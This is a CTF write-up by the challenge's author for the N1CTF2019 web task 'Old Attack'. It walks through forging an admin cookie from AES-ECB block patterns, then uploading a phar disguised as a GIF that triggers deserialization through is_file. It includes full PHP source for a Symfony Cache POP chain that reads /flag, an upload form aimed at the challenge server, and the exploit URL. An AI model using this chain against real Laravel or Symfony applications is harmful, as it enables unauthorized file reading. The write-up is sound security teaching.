# Old Attack

> In N1CTF2019,I designed a web task named Old Attack

### Step1

According to the task description, this is a too old attack.After you register for landing:

![1.jpg][1]

According to the content of the picture,u can find something in cookie

![image-20190908083455259.png][2]

It use AES-128-ECB to encrypt username,so we can use the defects of ECB encryption to be the admin

- 1:register aaaaaaaaaaaaaaaa to get auth_name
- 2:register aaaaaaaaaaaaaaaaadmin to get auth_name

To remove the same part, u can get admin's auth_name is `XAJSRxNvJLSyGo8r1aB6eQ%3D%3D`,replace your auth_name in cookie,u can get the step1's flag.I think it is too old attack:

![3.jpg][3]

## Step2

Okay,and now u can get the source code.It looks one easy Laravel Demo.And the path is `/var/www/html/babyphoto`

![image-20190908084729832.png][4]

Laravel's method is in `app/Http/Controllers`,view the `ctferController.php`:

It looks very small:

```php
    public function userpage(Request $request,$id)
    {   
        if($request->isMethod('get')){
          if(isset($_COOKIE['auth_name'])){
            $auth_check=$this->decrypt($_COOKIE['auth_name']);}else{
            $auth_check=Auth::user()->name;
          }
          if($auth_check==='admin'){
              $imgurl="";
              $usern='admin';
          }else{
              $imgurl="";
              $usern=Auth::user()->name;
          }
          return view('userpage')->with([
              'imgurl'=>$imgurl,
              'username'=>$usern,
              'id'=>$id
          ]);
        }else{
          if(Auth::user()->email_verified_at){
                  $file=$request->file('avatar');
                  $data=file_get_contents('/tmp/'.$file->getFilename());
                  $filesize=$file->getClientSize();
                  if($filesize > 204800){
                      die("too big");
                  }
                 //waf is here.don't rce.
                  $file->storeAs('avatars',md5(time().Auth::user()->id).'.gif');
          }else{
            die('NO!');
            }
        }      
    }
```

When the `$request->isMethod` is POST.U can upload something,but `if(Auth::user()->email_verified_at)` default is NULL.

In `routes/api.php`:

![image-20190908085122085.png][5]

U can update your account by visit `/api/user/account@mail`.

- e.g. /api/user/venenof7@nu1l.com

![image-20190908085450722.png][6]

And now,u can upload anything:)

If u read the official document of Laravel ,u will find something in blade:

![image-20190908214054010.png][7]

Okay,now,in the source code,u will find this:

![image-20190908214231716.png][8]

and `user_session` use in `resources/views/userpage.blade.php`:

![image-20190908214353816.png][9]

The `{id}` is in `route/web.php`:

```php
Route::any('/userpage/{id}', 'ctferController@userpage');
```

So,as everyone knows,`is_file` can trigger phar's unserialize.

So,in `vendor/symfony`,u will find pop chain,payload here:

```php
<?php


namespace Symfony\Component\Cache{
    class CacheItem
    {
        protected $expiry=1;
        protected $innerItem='/flag';
        protected $poolHash=1;
    }
}
namespace Symfony\Component\Cache\Adapter{
    use Symfony\Component\Cache\CacheItem;
    class TagAwareAdapter
    {
        private $deferred;
        private $pool; 
        public function __construct(){
            $this->deferred=array(new CacheItem());
            $this->pool=new ProxyAdapter();
        }
    }
    class ProxyAdapter
    {
        private $setInnerItem='readfile';
        private $poolHash=1;
    }
    $a=new TagAwareAdapter();
    $p = new Phar('./1.phar', 0);
    $p->startBuffering();
    $p->setStub('GIF89a __HALT_COMPILER(); ?>');
    $p->setMetadata($a);
    $p->addFromString('1.txt','text');
    $p->stopBuffering();
    rename('./1.phar', 'aa.gif');
}
```

And now,upload `aa.gif`:

```html
<html>
<body>
<form action="http://150.109.197.222/userpage/1" method="post"
enctype="multipart/form-data">
<label for="file">Filename:</label>
<input type="file" name="avatar" id="files" /> 
  <input type="hidden" name="_token" value="gBUxN4LrvxIJCn3R5UaSaAcx8aPJ8o4ulFWEgzHD">
<br />
<input type="submit" name="submit" value="Submit" />
</form>
</body>
</html>
```

And u can visit `http://150.109.197.222/time.php` to get `time()`
e.g:file path is `/var/www/html/babyphoto/storage/app/avatars/73b79c6410809385dd2ebef592041ee4.gif`

And u can use phar to read the flag by visit:
`http://150.109.197.222/userpage/cGhhcjovLy92YXIvd3d3L2h0bWwvYmFieXBob3RvL3N0b3JhZ2UvYXBwL2F2YXRhcnMvNzNiNzljNjQxMDgwOTM4NWRkMmViZWY1OTIwNDFlZTQuZ2lm`

![image-20190908221244758.png][10]


  [1]: http://www.venenof.com/usr/uploads/2019/09/4219885634.jpg
  [2]: http://www.venenof.com/usr/uploads/2019/09/423442362.png
  [3]: http://www.venenof.com/usr/uploads/2019/09/1273886672.jpg
  [4]: http://www.venenof.com/usr/uploads/2019/09/1687218789.png
  [5]: http://www.venenof.com/usr/uploads/2019/09/87060556.png
  [6]: http://www.venenof.com/usr/uploads/2019/09/1849826831.png
  [7]: http://www.venenof.com/usr/uploads/2019/09/3653729078.png
  [8]: http://www.venenof.com/usr/uploads/2019/09/3339351244.png
  [9]: http://www.venenof.com/usr/uploads/2019/09/981479089.png
  [10]: http://www.venenof.com/usr/uploads/2019/09/3836102465.png
